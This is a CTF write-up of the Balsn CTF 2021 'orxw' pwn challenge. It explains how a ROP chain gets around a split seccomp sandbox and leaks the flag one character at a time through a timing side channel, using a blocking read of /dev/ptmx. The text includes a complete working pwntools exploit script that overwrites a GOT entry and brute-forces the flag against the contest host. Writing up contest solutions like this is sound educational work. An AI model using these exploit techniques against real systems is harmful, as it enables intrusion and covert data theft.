**Orxw**

was a pwn challenge from Balsn CTF 2021 edition.

It was a, "not so hard, not so easy" challenge, but interesting..

let's have a look to the reverse:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Balsn.CTF.2021/pwn/orxw/pics/reverse.png)

pretty simple as you can see, the program reads up to 0x400 bytes to a 16 bytes buffer (obviously a lot too much...)

then it forks. The parent process waits for the child to exits, then setup a seccomp.. The child closes all file descriptors, then setup a seccomp also..

then, they both return to the rop that we can put on stack...

as the parent waits for the child to exit, the ROP we send will be executed by the child first, then it will be executed by the parent too.

the child seccomp in place looks like this:

![](https://github.com/nobodyisnobody/write-ups/raw/main/Balsn.CTF.2021/pwn/orxw/pics/seccomp.png)

basically only read, open, exit, exit_group, and openat syscalls are authorized , so no way to send, or write something... just open and read...

and for the parent, the seccomp only allows write , exit ,and exit_group.. so the parent can write, but not open, or read.. pretty useless also..

Opening and reading the flag (from the child) is not a difficult task.

We have the almost always present gadgets on x64 binaries produced by GCC,

the add & csu gadgets:

```
gadget_add = 0x000000000040125c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
gadget_csu = 0x000000000040156a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget_csu2 = 0x401550 # mov rdx,r14  /  mov rsi,r13 / mov edi,r12d  / call qword[r15+rbx*8] + 7 pop
```

with that 3 gadgets, we can write whatever values where we want in memory,  or modify a got entry to change a function to another for example..

if we cannot exfiltrate data via classic channels (stdout, socket, etc...), we can exfiltrate data via another channel, time..

yes a bit like Doctor Who ;)

if we can read the flag in memory, we need a way to test all characters possible at a given letter position, if the character is good, we can go in a infinite loop,

if it's not the correct character, we exit (or crash, no importance...)

the way I found, was to open '/dev/ptmx' device,  we have the necessary rights to do it, and to read from it..

it will block, and indicate that the correct character is found...

the trick I used was to read the flag's character to be tested at the next byte after '/dev/ptmx' string on .bss,  and to add a choosen value to make it equal to zero,

to zero terminate the string in fact..

if the value is correct we can deduce the character of the flag..

if the value is incorrect, the '/dev/ptmx' string will not be zero terminated, the opening of the device will failed, and the next read also..so the program will exit or crash immediatly..

if the string is well zero terminated, it will block indefintely.. and we know that the character guess was correct...

well.. if you don't understand my explanation...:)  read the code...

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./orxw')
rop = ROP(exe)

host, port = "orxw.balsnctf.com", "19091"


gadget_add = 0x000000000040125c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
gadget_csu = 0x000000000040156a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget_csu2 = 0x401550 # mov rdx,r14  /  mov rsi,r13 / mov edi,r12d  / call qword[r15+rbx*8] + 7 pop

def add_gadget(address, val):
  global gadget_add
  global gadget_csu
  return p64(gadget_csu)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*4+p64(gadget_add)

def write_string(address, data):
  l = (len(data)+3) & ~3
  m = data.ljust(l,'\x00')
  n = ''
  for i in range(l/4):
    n += add_gadget(address+(i*4), u32(m[(i*4):(i*4)+4])) 
  return n


pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = 0x0000000000401571 # pop rsi ; pop r15 ; ret

bss = 0x404900

flag = 'BALSN{'
pos=len(flag)

while (pos<64):
	char = 0x20
	while (char<0x7e):
		p = remote(host,port)
		offset = 0x100-char

		print('testing char: '+chr(char))
		devname = '/dev/ptmx'

		payload = 'A'*16+p64(0xdeadbeef)
		# change close to open (by adding 0xfffff4e0 to close got entry)
		payload += add_gadget(exe.got['close'], 0xfffff4e0)
		# write 'flag' string in bss 
		payload += add_gadget(0x404800, u32(b'flag'))
		# open the flag file (fd will be 0 as there are no fd opened)
		payload += p64(pop_rdi)+p64(0x404800)+p64(pop_rsi)+p64(0)*2+p64(exe.sym['close'])
		# read the chars before pos (will be overwritten)
		payload += p64(gadget_csu)+p64(0)+p64(1)+p64(0)+p64(bss+(len(devname)))+p64(pos)+p64(exe.got['read'])+p64(gadget_csu2)+p64(0)*7
		# read the char at pos
		payload += p64(gadget_csu)+p64(0)+p64(1)+p64(0)+p64(bss+(len(devname)))+p64(1)+p64(exe.got['read'])+p64(gadget_csu2)+p64(0)*7
		# try to guess char at pos , by adding offset to him to make it zero
		payload += add_gadget(bss+len(devname), offset)
		# write '/dev/ptmx' string in bss
		payload += write_string(0x404900, devname)
		# open the device, (will be correct if char zero terminates the string..)
		payload += p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)*2+p64(exe.sym['close'])
		# try to read from device (will block if device name is correct)
		payload += p64(gadget_csu)+p64(0)+p64(1)+p64(1)+p64(0x404700)+p64(64)+p64(exe.got['read'])+p64(gadget_csu2)+p64(0)*7
		# then exits
		payload += p64(exe.sym['_exit'])

		try:
		  p.sendlineafter('orxw?\n', payload)
		  start = time.time()		# measure time to return
		  print(p.recv(timeout=3))	# timeout 3 seconds maxi, if read block remotely (and char guess is correct so)
		  end = time.time()
		except:
		  end = time.time()

		p.close()
		if (end-start)>2:			# if it takes more than 2 seconds (around 3) , then the guess was correct
			print('char found: '+chr(char))
			flag += chr(char)
			print('flag = '+flag)
			break
		char += 1
	pos+=1

  
```

*nobodyisnobody still pwning things*

